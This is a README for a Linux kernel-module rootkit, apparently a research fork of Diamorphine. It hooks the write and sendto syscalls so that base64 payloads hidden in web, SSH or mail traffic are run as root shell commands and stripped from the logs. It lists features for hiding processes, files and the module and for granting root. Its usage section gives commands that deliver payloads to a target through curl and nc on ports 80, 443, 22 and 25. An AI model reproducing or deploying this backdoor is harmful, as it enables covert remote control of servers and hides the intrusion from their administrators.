# DISCLAIMER
## This is a POC
This is a **research project**, which has been made by a noobist in C, LKM and low-level stuff in general. If it's not clear enough yet : this source code is more likely to be full of mistakes in terms of memory management, compliance to LKM or POSIX APIs.

**DO NOT use this tool** on production servers and without the prior consent from the owner of the system, as you may very probably damage the system.

If you're ever so bold to try and use this in the wild, you do it **at your own risks, understanding your responsibilities**.

**The authors of this source code CANNOT be held responsible for any damage caused by the use of this research project.**

# xt_rip LKM rootkit
This rootkit is an attempt to use `write` and `sendto` syscalls as input vectors for a remote backdoor.

## Credits
This project is forked from m0nad's awesome Diamorphine, and it's also been the most helpful piece of clue I had to develop my own features. If you don't know this project yet, go check it out, it is fascinating.

This project is titled differently because its a different project, with lower quality expectations, lower stability etc - seriously, don't use this thing.

## How it works
A lot of user-provided and unsafe data gets processed through `write` and `sendto` syscalls since they are used to log connections to web server, failed ssh connections etc.

The module replaces the original syscalls by our own functions which looks for a pattern, extract it so it can be parsed as a C&C command, and strips it from the original buffer so it (hopefully) does not appear anywhere in the logs.

## Features
- [x] All features from Diamorphine
    - [x] Hide process with `kill -31 $PID`
    - [x] Hide LKM with `kill -63 1`
    - [x] Give root with `kill -64 1`
    - [x] Hide files and dirs with name matchin prefix
- [x] Hook `write` and `sendto`
    - [x] Read and strip payload from given userland buffer
    - [x] Decode base64 payload
    - [x] Pass payload to /bin/sh
    - [x] Hide generated process
    - [ ] Add mandatory checksum to payload
- [ ] Hide arbitrary network connection (http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-7-SECT-4.html)

## Usage
```sh
## On the target
# Install dependencies (apt only), build
# and install module
make

## From the C&C
# Store marker
$ export XTRIP_MARKER=8231061ecdb0740331d2

# Generate payload
$ ./client 'id > /tmp/id'
8231061ecdb0740331d2AwqGpIaVDg1Wl2LK8231061ecdb0740331d2

# Generate payload and send it to target
# through HTTP on port 80
$ ./client 'id > /tmp/id' $TARGET

# Manually send payload to web server
# on port 443
$ curl -skA"$(./client 'id > /tmp/id')" https://$TARGET/

# Send payload to SSH on port 22
$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 22

# Send payload to Exim4 on port 25
$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 25
```